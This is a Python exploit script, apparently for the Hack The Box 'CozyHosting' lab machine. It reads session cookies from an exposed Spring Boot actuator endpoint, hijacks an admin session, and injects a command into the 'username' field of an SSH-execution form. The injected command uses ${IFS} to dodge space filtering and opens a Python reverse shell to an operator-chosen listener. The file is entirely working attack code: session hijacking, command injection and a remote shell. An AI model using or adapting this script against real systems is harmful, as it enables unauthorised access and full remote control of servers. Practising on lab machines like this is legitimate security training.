import requests, os

def GetSpringBootActuator():
    # Fetch Sessions
    r = requests.get("http://cozyhosting.htb/actuator/sessions")
    sessionInfo = str(r.content)
    print("[+] Sessions: " + sessionInfo)
    hijackCookie = input("[*] Enter in kanderson\'s Cookie: ")
    ShellExecution(hijackCookie)

def ShellExecution(hijackCookie):
    s = requests.session()
    r = s.get("http://cozyhosting.htb/admin", allow_redirects=False)

    if r.status_code == 301:
        print("[-] Bad Cookie")
        GetSpringBootActuator()

    Headers = {
        "Host":"cozyhosting.htb",
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.5",
        "Accepted-Encoding":"gzip, deflate",
        "Content-Type":"application/x-www-form-urlencoded",
        "Origin":"http://cozyhosting.htb",
        "Referer":"http://cozyhosting.htb/admin",
        "Connection":"close",
        "Cookie":"JSESSIONID="+str(hijackCookie),
        "Upgrade-Insecure-Requests":"1"
    }

    IP = str(input("Enter Listener IP: "))
    Port = str(input("Enter Listener Port: "))
    payload = ";python3${{IFS}}-c${{IFS}}\'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"{}\",{}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/bash\")\';".format(IP, Port)

    Data = {
        "host":"127.0.0.1",
        "username":payload
    }
    
    s.get("http://cozyhosting.htb/admin", headers=Headers)
    s.post("http://cozyhosting.htb/executessh", headers=Headers, data=Data)

def main():
    GetSpringBootActuator()

if __name__ == "__main__":
    main()